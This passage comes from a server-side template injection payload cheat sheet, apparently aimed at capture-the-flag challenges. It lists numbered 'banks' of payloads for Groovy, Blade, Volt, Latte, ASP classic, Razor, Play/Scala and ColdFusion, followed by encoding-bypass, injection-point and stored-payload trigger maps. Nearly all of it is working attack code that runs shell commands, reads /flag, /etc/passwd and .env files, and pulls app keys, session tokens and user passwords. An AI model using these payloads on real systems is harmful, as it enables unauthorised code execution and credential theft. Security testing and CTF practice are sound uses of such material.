${this.class.classLoader.loadClass('java.lang.Runtime')}
${'x'.getClass()}
${'x'.class}
${'x'.class.forName('java.lang.Runtime')}
${'x'.metaClass}
${'x'.metaClass.methods}
${'x'.metaClass.methods.name}
${'x'.getMetaClass().getMethods()}
${'x'.getMetaClass().getMethods().name}
${'x'.invokeMethod('getClass',[])}
${def x=1}
${new GroovyShell().evaluate("'id'.execute().text")}
${new GroovyShell().evaluate("new File('/flag').text")}
${Eval.me("'id'.execute().text")}
${Eval.me("'cat /flag'.execute().text")}
${new Binding()}
${new GroovyClassLoader()}
```

Groovy is full-language — `Eval.me(expr)` is inline-eval —
`'x'.execute()` the one-liner — `new GroovyShell()` the meta-eval.

## 34. The Blade bank

```php
@php(system('id'))@endphp
@php(system('cat /flag'))@endphp
@php echo `id`; @endphp
@php echo `cat /flag`; @endphp
@php($x=shell_exec('id'))
@php($x=shell_exec('cat /flag'))
@php passthru('id'); @endphp
@php passthru('cat /flag'); @endphp
@php echo file_get_contents('/flag'); @endphp
@php var_dump(file('/flag')); @endphp
@php var_dump(scandir('/')); @endphp
@php print_r(get_defined_vars()); @endphp
@php echo getenv('FLAG'); @endphp
@php echo $_SERVER['FLAG']; @endphp
@php echo $_ENV['FLAG']; @endphp
{{system('id')}}
{{eval('system("id")')}}
{{passthru('id')}}
{{shell_exec('id')}}
{{shell_exec('cat /flag')}}
{{file_get_contents('/flag')}}
{{file_get_contents('/etc/passwd')}}
{{readfile('/flag')}}
{{scandir('/')}}
{{glob('/*')}}
{{getenv('FLAG')}}
{{$_SERVER['FLAG']}}
{{$_ENV['FLAG']}}
{{$_SERVER}}
{{$_ENV}}
{{$_REQUEST}}
{{$_GET}} {{$_POST}} {{$_COOKIE}} {{$_SESSION}}
{{app()}}
{{app('request')}}
{{app('config')}}
{{app('config')->get('flag')}}
{{app('config')->all()}}
{{app('env')}}
{{app('request')->input()}}
{{app('request')->header('x')}}
{{app('request')->cookie('x')}}
{{app('request')->server('FLAG')}}
{{app('db')}}
{{app('db')->select('select * from flag')}}
{{app('db')->table('flag')->get()}}
{{app('db')->table('flag')->first()}}
{{config('flag')}}
{{config('app.key')}}
{{config('database.connections')}}
{{env('FLAG')}}
{{env('APP_KEY')}}
{{session()}}
{{session()->all()}}
{{session()->get('flag')}}
{{session()->token()}}
{{request()}}
{{request()->input()}}
{{request()->query('x')}}
{{request()->cookie('x')}}
{{request()->header('x')}}
{{request()->server('FLAG')}}
{{auth()}} {{auth()->user()}}
{{auth()->user()->password}}
{{Auth::user()}}
{{Auth::user()->password}}
{{csrf_token()}}
{{$x}} {{$x->flag}} {{$x->secret}}
{{$errors}} {{$errors->all()}}
{{$loop}} {{$loop->index}}
{{$__env}}
{{$__env->getContainer()}}
{{$__env->getContainer()->make('config')}}
{{$__env->getContainer()->make('config')->get('flag')}}
{!! $x !!}
{!! system('id') !!}
{!! passthru('cat /flag') !!}
{!! file_get_contents('/flag') !!}
{!! readfile('/flag') !!}
{!! shell_exec('cat /flag') !!}
{!! eval('file_get_contents("/flag")') !!}
@verbatim {{x}} @endverbatim
@inject('name', 'service')
@inject('c', 'config') @php($c->get('flag'))
@inject('r', 'request')
@inject('db', 'db')
@inject('app', 'app')
@extends('layout')
@include('flag')
@include('/flag')
@include('../flag')
@include('../../flag')
@includeIf('flag')
@includeWhen(true, 'flag')
@includeFirst(['flag','x'])
@dump($x)
@dd($x)
@php(var_dump($x))
@json($x)
{{base_path() . '/flag'}}
{{file_get_contents(base_path().'/flag')}}
{{file_get_contents(storage_path('app/flag'))}}
{{file_get_contents(base_path() . '/.env')}}
{{Storage::get('flag')}}
{{Storage::disk('local')->get('flag')}}
{{Storage::disk('public')->files()}}
{{DB::table('flag')->get()}}
{{DB::select('select * from flag')}}
{{DB::select('select flag from flags limit 1')}}
{{User::all()}} {{User::first()}}
{{User::first()->password}}
{{App\Models\User::all()}}
{{App\Models\Flag::all()}}
```

Blade `{{$x}}` renders `e($x)` — escaped; `{!!$x!!}` raw;
`@php{}`/`@endphp` executes; `{{fn()}}` calls bound-fns;
`{{app()}}`/`{{config()}}`/`{{env()}}` helpers reach the container.

## 35. The Volt bank

```volt
{{7*7}}
{{'a'~'b'}}
{{file_get_contents('/flag')}}
{{system('id')}}
{{passthru('cat /flag')}}
{{shell_exec('id')}}
{{getenv('FLAG')}}
{{constant('FLAG')}}
{{this}}
{{this.getDi()}}
{{this.getDi().get('config')}}
{{this.getDi().get('request')}}
{{this.getDi().get('request').getServer('FLAG')}}
{{this.request}}
{{this.request.getServer('FLAG')}}
{{this.session}}
{{this.session.get('flag')}}
{{this.cookies}}
{{this.router}}
{{this.url}}
{{security}}
{{security.hash}}
{{flash}}
{{flashSession}}
{{tag}}
{{tag.textField()}}
{{assets}}
{{dump(x)}}
{{dump(_context)}}
```

## 36. The Latte bank

```php
{=7*7}
{=system('id')}
{=passthru('cat /flag')}
{=file_get_contents('/flag')}
{=shell_exec('cat /flag')}
{=getenv('FLAG')}
{=$_SERVER['FLAG']}
{=$_ENV['FLAG']}
{=constant('FLAG')}
{=get_defined_vars()}
{=get_defined_constants()}
{=scandir('/')}
{=glob('/*')}
{=new FilesystemIterator('/')}
{=eval('system("id")')}
{$x}
{$x->flag}
{$x->getFlag()}
{$this}
{$this->getGlobal()}
{$this->getParameters()}
{include 'flag'}
{include '/flag'}
{include '../flag'}
{import 'flag'}
{block x}{/block}
{ifset $x}{/ifset}
{foreach $x as $y}
{var_dump($x)}
{dump($x)}
{php system('id')}
{php file_get_contents('/flag')}
```

## 37. The ASP-classic bank

```asp
<%=7*7%>
<%=UCase("a")%>
<%=Request.ServerVariables("FLAG")%>
<%=Request.ServerVariables%>
<%=Request.QueryString%>
<%=Request.Form%>
<%=Request.Cookies%>
<%=Session("x")%>
<%=Application("x")%>
<%=Response.Write(x)%>
<%Response.Write(x)%>
<%Dim x : x=7*7 : Response.Write x%>
<%Execute("Response.Write(7*7)")%>
<%=Eval("7*7")%>
<%Set x=CreateObject("WScript.Shell")%>
<%Set x=CreateObject("WScript.Shell") : y=x.Exec("cmd /c id")%>
<%Set f=CreateObject("Scripting.FileSystemObject") : Set t=f.OpenTextFile("C:\flag") : Response.Write t.ReadAll%>
<%Set f=Server.CreateObject("Scripting.FileSystemObject")%>
<%=Server.CreateObject("WScript.Shell")%>
<%=Server.MapPath("/")%>
<%=Server.MapPath("/flag")%>
<%=Server.MapPath(".")%>
<%=Server.HTMLEncode(x)%>
<%=Server.URLEncode(x)%>
```

ASP `Execute(string)` — VBScript eval — full script-reach.

## 38. The Razor bank (.NET)

```razor
@7*7
@(7*7)
@{var x=7*7;}
@System.IO.File.ReadAllText("/flag")
@System.IO.File.ReadAllText("C:\\flag")
@System.IO.File.ReadAllLines("/flag")
@System.IO.Directory.GetFiles("/")
@System.IO.Directory.GetDirectories("/")
@System.Diagnostics.Process.Start("cmd","/c id")
@System.Diagnostics.Process.Start("/bin/sh","-c 'cat /flag'")
@System.Environment.GetEnvironmentVariable("FLAG")
@System.Environment.GetEnvironmentVariables()
@System.Environment.OSVersion
@this
@this.GetType()
@this.GetType().Assembly
@this.GetType().Assembly.GetTypes()
@Context
@Context.Request
@Context.Request.Headers
@Context.Request.Cookies
@Context.Items
@ViewBag
@ViewBag.flag
@ViewData
@ViewData["flag"]
@TempData
@TempData["flag"]
@Model
@Model.flag
@Model.GetType()
@Model.GetType().GetProperties()
@functions{ string F(){return System.IO.File.ReadAllText("/flag");} }
@F()
@Html.Raw(x)
@Html.Raw(System.IO.File.ReadAllText("/flag"))
@Url.Content("~/x")
@await Html.PartialAsync("/flag")
@await Html.RenderPartialAsync("x")
@Server.MapPath("~")
@Server.MapPath("/")
```

`@functions{}` declares methods → then `@F()` calls — define a
helper that reads the file — multi-line code in one injection.

## 39. The Play/Scala bank

```scala
@(7*7)
@{7*7}
@x.getClass()
@System.getenv()
@System.getenv("FLAG")
@System.getProperty("os.name")
@Runtime.getRuntime().exec("id")
@Runtime.getRuntime().exec("cat /flag")
@new java.util.Scanner(new java.io.File("/flag")).next()
@new java.io.File("/flag")
@scala.io.Source.fromFile("/flag")
@scala.io.Source.fromFile("/flag").mkString
@scala.io.Source.fromFile("/flag").getLines().mkString
@import java.io.File
@import scala.io.Source
@Source.fromFile("/flag").mkString
@import java.lang.Runtime
@Runtime.getRuntime().exec("id")
@defining(7*7){x=>@x}
@defining(new java.io.File("/flag")){f=>@f}
@if(true){x}
@for(x<-xs){@x}
@request
@request.headers
@request.cookies
@session
@session.get("flag")
@flash
@flash.get("flag")
@context
@messages
@lang
@config
@config.getString("flag")
@env
@env.getProperty("flag")
```

## 40. The ColdFusion bank (.cfm)

```cfm
#7*7#
#x.y#
#CreateObject('java','java.lang.Runtime')#
#CreateObject('java','java.lang.Runtime').getRuntime().exec('id')#
#CreateObject('java','java.lang.System').getenv()#
#CreateObject('java','java.lang.System').getenv('FLAG')#
#CreateObject('java','java.io.FileReader').init('/flag')#
#FileRead('/flag')#
#FileReadLine('/flag',1)#
#DirectoryList('/')#
#DirectoryList('/',true,'query')#
#ExpandPath('/')#
#GetCurrentTemplatePath()#
#CGI.SCRIPT_NAME# #CGI.SERVER_NAME#
#CGI.http_user_agent#
#SERVER#
#SERVER.coldfusion#
#SERVER.os#
#SESSION# #APPLICATION# #COOKIE#
#GetEnvironmentVariable('FLAG')#
<cffile action="read" file="/flag" variable="x">#x#
<cfexecute name="id" timeout="10" variable="y">#y#
<cfexecute name="/bin/sh" arguments="-c 'cat /flag'" variable="y">#y#
<cfexecute name="cmd" arguments="/c id" variable="y">#y#
<cfdump var="#x#">
<cfdump var="#SERVER#">
<cfdump var="#application#">
<cfscript>
  x=createObject("java","java.lang.Runtime").getRuntime().exec("id");
  writeOutput(x);
</cfscript>
```

ColdFusion `#expr#` — `#` is the sigil — `CreateObject` is the
java-reach — `cfexecute` runs commands.

## 41. The encoding-mutation bank — all engines

```text
url-double:   %257B%257B7*7%257D%257D   → {{7*7}} after double-decode
              — proxies decode once, app once → the payload
              arrives {{7*7}} at the app
html-ent:     &#123;&#123;7*7&#125;&#125; → {{7*7}} — if the app
              html-decodes before templating
mixed:        %7B&#123;7*7&#125;%7D  → mixed-encoding
fullwidth:    ｛｛7*7｝｝                  — fullwidth {} — normalize→{}
zero-width:   {​{7*7}}                — zero-width between braces —
              filter sees nothing contiguous
newline:      {{\n7*7}}               — newline inside — parser-
              tolerant in most engines
split-input:  ?a={{&b=7*7}}&c=        — if app concatenates —
              the engine sees {{7*7}}
```

## 42. The content-type mutation bank

```text
GET param:        ?name={{7*7}}
POST form:        name={{7*7}}
POST JSON:        {"name":"{{7*7}}"} — json-body fields into the
                  same render — check content-type switching
POST multipart:   field
PATH:             /x/{{7*7}}/y — segment injection
HEADER:           X-Custom: {{7*7}} — reflected headers
COOKIE:           Cookie: x={{7*7}} — cookie-render
REFERER:          Referer: http://x/{{7*7}} — analytics-render
USER-AGENT:       User-Agent: {{7*7}} — log-render
HOST:             Host: {{7*7}} — host-header — proxy-dependent
X-Forwarded-For:  XFF: {{7*7}} — ip-logs render
JSON nested:      {"a":{"b":{"c":"{{7*7}}"}}} — deep-field
JSON array:       {"x":["{{7*7}}"]} — array-element
JSON key:         {"{{7*7}}":"v"} — key-position
XML body:         <x>{{7*7}}</x>
Multipart-name:   filename="{{7*7}}" — filename-field
Content-Disposition name="{{7*7}}"
```

## 43. The second-order bank — stored → render

```text
profile.bio={{7*7}}         → view-profile + admin-view both fire
post.title={{7*7}}          → listing + detail
comment={{7*7}}             → thread-render + admin-moderation
order.notes={{7*7}}         → order-detail + confirmation-email +
                              invoice-pdf + support-view
product.desc={{7*7}}        → catalog + admin + PDF-spec
ticket.body={{7*7}}         → support-dash + notification-mail
username={{7*7}}            → greeting + admin-list + audit-log
template-file={{7*7}}       → the upload/preview itself
theme={{7*7}}               → layout — all-pages
slug={{7*7}}                → url-gen + page-title
signature={{7*7}}           → email-footer — every mail
footer={{7*7}}              → site-footer — every page
settings.theme={{7*7}}      → per-user-theme
report.name={{7*7}}         → report-listing + the report itself
search-term={{7*7}}         → history-view + "recent searches"
```

## 44. The deferred-trigger map — where the render happens

```text
save profile         → view /profile        → profile-render
save + admin-visit   → /admin/users          → admin-render
order → /invoice/X   → the PDF               → pdf-render
order → confirmation → the email             → mail-render
submit ticket        → support-queue         → admin-render
write review         → product-page + admin  → both
comment              → thread + moderator    → both
set theme            → every page            → layout-render
report request       → nightly batch         → batch-render
mail signup          → welcome-mail          → mail-render
upload template      → preview-endpoint      → render-endpoint
```

Each deferred-render = one shot — polyglot + grab-bag.
